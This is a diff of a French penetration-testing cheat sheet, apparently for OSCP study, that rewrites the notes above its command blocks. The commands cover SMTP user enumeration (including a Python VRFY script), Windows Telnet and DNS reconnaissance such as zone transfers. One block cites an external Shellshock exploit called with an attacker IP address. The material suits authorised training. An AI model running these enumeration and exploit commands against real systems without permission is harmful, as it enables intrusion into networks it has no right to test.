@@ -768,7 +768,7 @@ scp -i ~/.ssh/id_ed25519 script.sh utilisateur@192.0.2.10:/home/utilisateur/
 
 ```
 
-<p class="oscp-command-note">Se connecter avec une clé SSH privée.</p>
+<p class="oscp-command-note">SSH : ouvrir une session avec une clé privée locale ; protéger son fichier avec chmod 600.</p>
 
 ```bash
 ssh -i <private_key_file> <user>@<target_ip>
@@ -790,19 +790,19 @@ telnet -l utilisateur 192.0.2.10 23
 
 ### 25: SMTP
 
-<p class="oscp-command-note">SMTP : relever les commandes annoncées et tester l'énumération de comptes ; les scripts CVE exigent un contrôle ciblé préalable.</p>
+<p class="oscp-command-note">SMTP : interroger les capacités et réponses VRFY ; séparer commandes shell, saisie interactive et sortie illustrative.</p>
 
 ```bash
 # Identifier les capacités SMTP et les réponses à l'énumération d'utilisateurs
 nmap -sV -p 25 --script smtp-commands,smtp-enum-users 192.0.2.10
 
-# Dialogue SMTP manuel : ouvrir une seule connexion puis saisir EHLO et VRFY dans cette session
+# Dialogue SMTP : ouvrir une seule connexion avec nc OU telnet, puis saisir EHLO et VRFY dans cette session
 nc -nv <target_ip> 25
 telnet <target_ip> 25
 EHLO exemple.local
 VRFY utilisateur
 
-# Exemple d'interaction (sortie illustrative)
+# Transcription illustrative de session SMTP : ne pas exécuter ces lignes dans Bash
 kali@kali:~$ nc -nv 192.168.123.8 25
 (UNKNOWN) [192.168.123.8] 25 (smtp) open
 220 mail ESMTP Postfix (Ubuntu)
@@ -814,7 +814,7 @@ VRFY test_user
 
 ```
 
-<p class="oscp-command-note">Sorties illustratives d'un script SMTP local : vérifier le nom du fichier Python avant exécution.</p>
+<p class="oscp-command-note">SMTP : exemples de sorties du script local vrfy.py ; ne pas copier les invites ni les réponses comme commandes.</p>
 
 ```bash
 # Exemple de sortie d'un script nommé vrfy.py (fichier à créer depuis le bloc Python ci-dessous)
@@ -828,7 +828,7 @@ b'550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipi
 
 ```
 
-<p class="oscp-command-note">Script Python : implémentation de «SMTP».</p>
+<p class="oscp-command-note">Python SMTP : envoyer VRFY pour un utilisateur puis afficher la réponse du serveur sur TCP 25.</p>
 
 ```python
 import socket
@@ -861,7 +861,7 @@ s.close()
 
 ```
 
-<p class="oscp-command-note">Windows : activer le client Telnet puis tester le dialogue SMTP sur le port 25.</p>
+<p class="oscp-command-note">Windows : activer TelnetClient avec DISM (droits administrateur requis) ; la suite illustre une session SMTP.</p>
 
 ```powershell
 dism /online /Enable-Feature /FeatureName:TelnetClient
@@ -876,16 +876,16 @@ VRFY root
 
 ```
 
-<p class="oscp-command-note">Nmap (HTTP) : lancer les scripts NSE « http-shellshock ».</p>
+<p class="oscp-command-note">HTTP Shellshock : exemple de test NSE ciblant un CGI ; le script Python tiers cité n'est pas fourni.</p>
 
 ```bash
 # Vérifier une exposition potentielle à Shellshock sur un CGI du laboratoire
 nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 192.0.2.10
                 
-# Reference: https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
+# Référence historique : https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
 python2 shellshock.py <target_ip> <username>@<domain> <attacker_ip> 139 <root>@<domain>
 
-# Exemple : python2 shellshock.py 192.168.1.100 emmanuel@domaine.local 192.168.1.50 139 admin@domaine.local
+# Exemple historique uniquement : script Python 2 externe ; vérifier sa provenance et ses paramètres avant utilisation
 
 ```
 
@@ -893,7 +893,7 @@ python2 shellshock.py <target_ip> <username>@<domain> <attacker_ip> 139 <root>@<
 
 Identifier les commandes annoncées par le serveur SMTP ; les résultats d'énumération utilisateurs doivent être confirmés.
 
-<p class="oscp-command-note">Capacités SMTP exposées.</p>
+<p class="oscp-command-note">Nmap SMTP : relever les commandes annoncées et tester l'énumération d'utilisateurs sur TCP 25.</p>
 
 ```bash
 nmap -sV -p 25 --script smtp-commands <IP_CIBLE>
@@ -904,7 +904,7 @@ nmap -p 25 --script smtp-enum-users <IP_CIBLE>
 
 `smtp-user-enum` teste l'existence des noms contenus dans un fichier avec la commande SMTP VRFY. Ne pas interpréter un refus comme la preuve que le compte n'existe pas. Voir [la syntaxe Kali](https://www.kali.org/tools/smtp-user-enum/).
 
-<p class="oscp-command-note">Énumération SMTP par VRFY.</p>
+<p class="oscp-command-note">SMTP VRFY : tester les noms d'un fichier avec smtp-user-enum ; une réponse négative n'est pas concluante.</p>
 
 ```bash
 smtp-user-enum -M VRFY -U <FICHIER_UTILISATEURS>.txt -t <IP_CIBLE>
@@ -914,7 +914,7 @@ smtp-user-enum -M VRFY -U <FICHIER_UTILISATEURS>.txt -t <IP_CIBLE>
 
 Méthode alternative si VRFY est désactivée. Ce contrôle envoie des requêtes au serveur et doit être limité au périmètre autorisé.
 
-<p class="oscp-command-note">Énumération SMTP par RCPT.</p>
+<p class="oscp-command-note">SMTP RCPT : tester les destinataires d'un fichier lorsque VRFY n'est pas disponible.</p>
 
 ```bash
 smtp-user-enum -M RCPT -U <FICHIER_UTILISATEURS>.txt -t <IP_CIBLE>
@@ -932,12 +932,12 @@ nmap -sU -p 53 --script dns-nsid,dns-recursion <IP_CIBLE>
 ```
 
 ```bash
-# Exécuter les scripts NSE sélectionnés
+# Nmap DNS : exécuter uniquement dns-nsid sur UDP 53
 nmap -sU -p 53 --script dns-nsid <IP_CIBLE>
 
 ```
 
-<p class="oscp-command-note">Requêtes DNS avec dig, puis dialogue interactif nslookup (saisir les trois dernières lignes dans nslookup).</p>
+<p class="oscp-command-note">DNS : tester AXFR et ANY avec dig ; ouvrir ensuite nslookup et saisir les commandes interactives séparément.</p>
 
 ```bash
 dig @192.0.2.53 exemple.local AXFR  # Tester un transfert de zone autorisé
@@ -957,21 +957,21 @@ dnsenum --enum --dnsserver <SERVEUR_DNS> <DOMAINE>
 
 ```
 
-<p class="oscp-command-note">Nmap -sL : demander la résolution DNS des adresses d'une plage sans scanner les ports.</p>
+<p class="oscp-command-note">Nmap -sL : lister les cibles d'une plage et tenter leur résolution inverse sans envoyer de sondes de scan.</p>
 
 ```bash
 nmap -sL <RESEAU_CIDR>  # Lister les cibles et tenter leur résolution DNS inverse, sans scanner les ports
 
 ```
 
-<p class="oscp-command-note">Interroger les enregistrements DNS.</p>
+<p class="oscp-command-note">DNS : interroger directement un serveur pour l'enregistrement A sans demander la récursion.</p>
 
 ```bash
 dig @<SERVEUR_DNS> <DOMAINE> A +norecurse
 
 ```
 
-<p class="oscp-command-note">Résoudre un nom DNS avec PowerShell.</p>
+<p class="oscp-command-note">PowerShell : résoudre un nom via le serveur DNS indiqué avec Resolve-DnsName.</p>
 
 ```powershell
 Resolve-DnsName -Name <DOMAINE> -Server <SERVEUR_DNS> -DnsOnly
@@ -982,7 +982,7 @@ Resolve-DnsName -Name <DOMAINE> -Server <SERVEUR_DNS> -DnsOnly
 
 Lister les serveurs de messagerie et les informations TXT d'un domaine appartenant au périmètre.
 
-<p class="oscp-command-note">Enregistrements MX et TXT.</p>
+<p class="oscp-command-note">DNS : afficher uniquement les réponses MX (messagerie) et TXT d'un domaine.</p>
 
 ```bash
 dig @<SERVEUR_DNS> <DOMAINE> MX +noall +answer
@@ -993,7 +993,7 @@ dig @<SERVEUR_DNS> <DOMAINE> TXT +noall +answer
 
 Vérifier si un transfert AXFR non autorisé est accepté par le serveur DNS.
 
-<p class="oscp-command-note">Transfert de zone DNS.</p>
+<p class="oscp-command-note">DNS AXFR : vérifier si le serveur autorise un transfert complet de zone pour le domaine audité.</p>
 
 ```bash
 dig @<SERVEUR_DNS> <DOMAINE> AXFR
